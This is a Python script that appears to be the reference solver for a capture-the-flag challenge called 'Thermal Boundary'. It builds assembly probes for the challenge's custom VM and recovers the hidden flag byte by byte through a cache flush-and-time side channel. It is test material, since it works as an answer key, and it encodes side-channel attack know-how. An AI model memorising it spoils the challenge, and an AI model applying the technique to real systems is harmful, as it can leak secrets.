#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import subprocess
import tempfile
from pathlib import Path
from typing import List

DEFAULT_CANDIDATE_START = 32
DEFAULT_CANDIDATE_END = 127


def assemble_program(assembler: Path, asm_text: str) -> bytes:
    with tempfile.TemporaryDirectory() as tmpdir:
        asm_path = Path(tmpdir) / "payload.asm"
        out_path = Path(tmpdir) / "payload.tb"
        asm_path.write_text(asm_text, encoding="utf-8")
        proc = subprocess.run(
            ["python", str(assembler), str(asm_path), str(out_path)],
            capture_output=True,
            text=True,
            check=False,
        )
        if proc.returncode != 0:
            raise RuntimeError(f"assembler failed: {proc.stderr.strip()}")
        return out_path.read_bytes()


def run_vm(binary: Path, bytecode: bytes) -> List[int]:
    env = os.environ.copy()
    env["NO_NET"] = "1"
    env["TB_QUIET"] = "1"
    env["TB_FORCE_ASCII"] = "1"
    proc = subprocess.run(
        [str(binary)],
        input=bytecode,
        capture_output=True,
        check=False,
        env=env,
        timeout=8,
    )
    if proc.returncode != 0:
        raise RuntimeError(proc.stderr.decode("utf-8", errors="replace"))

    values: List[int] = []
    for line in proc.stdout.decode("utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            values.append(int(line))
        except ValueError:
            continue
    return values


def build_probe_program(index: int, c_start: int, c_end: int) -> str:
    probe_base = 0x2000 + (c_start * 64)
    return f"""
LI r1, {index}
LI r2, {probe_base}
LI r3, {c_start}
LI r6, {c_end}
flush_loop:
CLFLUSH r2
ADDI r2, r2, 64
ADDI r3, r3, 1
BNE r3, r6, flush_loop
TRIGGER_SECRET
LI r2, {probe_base}
LI r3, {c_start}
probe_loop:
RDTSC r4
LD r5, 0(r2)
RDTSC r7
SUB r7, r7, r4
PRINT r7
ADDI r2, r2, 64
ADDI r3, r3, 1
BNE r3, r6, probe_loop
HALT
""".strip() + "\n"


def recover_flag(binary: Path, assembler: Path, max_len: int) -> str:
    recovered: List[str] = []
    candidates = list(range(DEFAULT_CANDIDATE_START, DEFAULT_CANDIDATE_END))

    for i in range(max_len):
        asm = build_probe_program(i, DEFAULT_CANDIDATE_START, DEFAULT_CANDIDATE_END)
        bytecode = assemble_program(assembler, asm)
        timings = run_vm(binary, bytecode)

        if len(timings) != len(candidates):
            raise RuntimeError(f"unexpected timing count for index {i}: got {len(timings)}")

        best_pos = min(range(len(candidates)), key=lambda k: timings[k])
        ch = chr(candidates[best_pos])
        recovered.append(ch)

        current = "".join(recovered)
        print(f"[{i:02d}] {ch} -> {current}")

        if ch == "}" and "{" in current:
            break

    return "".join(recovered)


def main() -> int:
    parser = argparse.ArgumentParser(description="Reference solver for Thermal Boundary")
    parser.add_argument("--binary", required=True, help="Path to thermal_boundary binary")
    parser.add_argument("--assembler", default="tools/assembler.py", help="Path to assembler script")
    parser.add_argument("--max-len", type=int, default=64, help="Maximum bytes to recover")
    parser.add_argument("--expect", default=None, help="Optional expected recovered flag")
    args = parser.parse_args()

    binary = Path(args.binary)
    assembler = Path(args.assembler)

    recovered = recover_flag(binary, assembler, args.max_len)
    print(f"recovered: {recovered}")

    if args.expect is not None and recovered != args.expect:
        print("mismatch: recovered flag does not match expected", flush=True)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
